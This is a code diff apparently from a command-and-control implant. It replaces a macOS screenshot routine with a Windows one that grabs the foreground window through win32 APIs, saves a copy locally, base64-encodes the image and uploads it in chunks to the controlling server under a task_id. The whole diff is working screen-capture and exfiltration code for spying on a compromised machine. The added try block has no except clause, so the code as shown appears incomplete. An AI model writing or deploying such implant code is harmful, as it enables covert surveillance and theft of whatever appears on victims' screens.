@@ -1,50 +1,101 @@
-    def screenshot(self, task_id):
-        from Cocoa import NSURL, NSBitmapImageRep
-        import LaunchServices
-        import Quartz
-        import Quartz.CoreGraphics as CG
-        region = CG.CGRectInfinite
-        image = CG.CGWindowListCreateImage(region, CG.kCGWindowListOptionOnScreenOnly, CG.kCGNullWindowID, CG.kCGWindowImageDefault)
-        sh_data = CG.CFDataCreateMutable(None, 0)
-        dest = Quartz.CGImageDestinationCreateWithData(sh_data, LaunchServices.kUTTypePNG, 1, None)
-        file_size = 0
-        if(dest):
-            Quartz.CGImageDestinationAddImage (dest, image, 0)
-            if (Quartz.CGImageDestinationFinalize(dest)):
-                file_size = CG.CFDataGetLength(sh_data)
+    def screenshot2(self, task_id):
+        try:
+            import win32gui, win32ui, win32con, win32api
+            from PIL import Image
+            import io, base64, json
+            from datetime import datetime
+            import os
 
-        if(file_size) > 0:
-            total_chunks = int(file_size / CHUNK_SIZE) + (file_size % CHUNK_SIZE > 0)
-            data = {
-                "action": "post_response", 
+            # Tenta capturar a janela ativa em vez da área de trabalho inteira
+            hwnd = win32gui.GetForegroundWindow()
+            if not hwnd:
+                hwnd = win32gui.GetDesktopWindow()
+                if not hwnd:
+                    return json.dumps({"error": "No window or desktop available in this session."})
+
+            left, top, right, bottom = win32gui.GetWindowRect(hwnd)
+            width = right - left
+            height = bottom - top
+
+            if width == 0 or height == 0:
+                return json.dumps({"error": "Invalid window dimensions."})
+
+            desktop_dc = win32gui.GetWindowDC(hwnd)
+            img_dc = win32ui.CreateDCFromHandle(desktop_dc)
+            mem_dc = img_dc.CreateCompatibleDC()
+
+            screenshot = win32ui.CreateBitmap()
+            screenshot.CreateCompatibleBitmap(img_dc, width, height)
+            mem_dc.SelectObject(screenshot)
+            mem_dc.BitBlt((0, 0), (width, height), img_dc, (0, 0), win32con.SRCCOPY)
+
+            bmpinfo = screenshot.GetInfo()
+            bmpstr = screenshot.GetBitmapBits(True)
+            img = Image.frombuffer(
+                'RGB',
+                (bmpinfo['bmWidth'], bmpinfo['bmHeight']),
+                bmpstr,
+                'raw',
+                'BGRX',
+                0,
+                1
+            )
+
+            # Limpeza
+            mem_dc.DeleteDC()
+            win32gui.ReleaseDC(hwnd, desktop_dc)
+            win32gui.DeleteObject(screenshot.GetHandle())
+
+            # Salva localmente (opcional)
+            screenshot_path = os.path.join(os.path.expanduser("~"), "Pictures", "Screenshots", f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
+            os.makedirs(os.path.dirname(screenshot_path), exist_ok=True)
+            img.save(screenshot_path, format='PNG')
+            print(f"Screenshot saved to: {screenshot_path}")
+
+            # Converte para bytes
+            img_byte_arr = io.BytesIO()
+            img.save(img_byte_arr, format='PNG')
+            img_data = img_byte_arr.getvalue()
+
+            file_size = len(img_data)
+            total_chunks = (file_size + CHUNK_SIZE - 1) // CHUNK_SIZE
+
+            # 1) Envia metadados iniciais para obter file_id
+            init_msg = {
+                "action": "post_response",
                 "responses": [
-                {
-                    "task_id": task_id,
-                    "total_chunks": total_chunks,
-                    "file_path": str(datetime.now()),
-                    "chunk_size": CHUNK_SIZE,
-                    "is_screenshot": True 
-                }]
+                    {
+                        "task_id": task_id,
+                        "total_chunks": total_chunks,
+                        "file_path": os.path.basename(screenshot_path),
+                        "chunk_size": CHUNK_SIZE,
+                        "is_screenshot": True
+                    }
+                ]
             }
-            initial_response = self.postMessageAndRetrieveResponse(data)
-            for i in range(0,total_chunks):
-                if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]:
-                    return "Job stopped."
+            initial_response = self.postMessageAndRetrieveResponse(init_msg)
+            file_id = initial_response["responses"][0].get("file_id")
 
-                if i == total_chunks:
-                    content = sh_data[i*CHUNK_SIZE:]
-                else:
-                    content = sh_data[i*CHUNK_SIZE:(i+1)*CHUNK_SIZE]
-                data = {
-                    "action": "post_response", 
+            if not file_id:
+                return json.dumps({"error": "Failed to retrieve file_id from initial response."})
+
+            # 2) Envia cada chunk numerado usando o mesmo file_id
+            for i in range(total_chunks):
+                start = i * CHUNK_SIZE
+                end = min((i + 1) * CHUNK_SIZE, file_size)
+                content = img_data[start:end]
+
+                chunk_msg = {
+                    "action": "post_response",
                     "responses": [
                         {
-                            "chunk_num": i+1,
-                            "file_id": initial_response["responses"][0]["file_id"],
-                            "chunk_data": base64.b64encode(content),
-                            "task_id": task_id                        
+                            "chunk_num": i + 1,
+                            "file_id": file_id,
+                            "chunk_data": base64.b64encode(content).decode(),
+                            "task_id": task_id
                         }
                     ]
                 }
-                response = self.postMessageAndRetrieveResponse(data)
-        return json.dumps({ "file_id": initial_response["responses"][0]["file_id"] })
+                self.postMessageAndRetrieveResponse(chunk_msg)
+
+            return json.dumps({"file_id": file_id, "total_chunks": total_chunks, "local_path": screenshot_path})
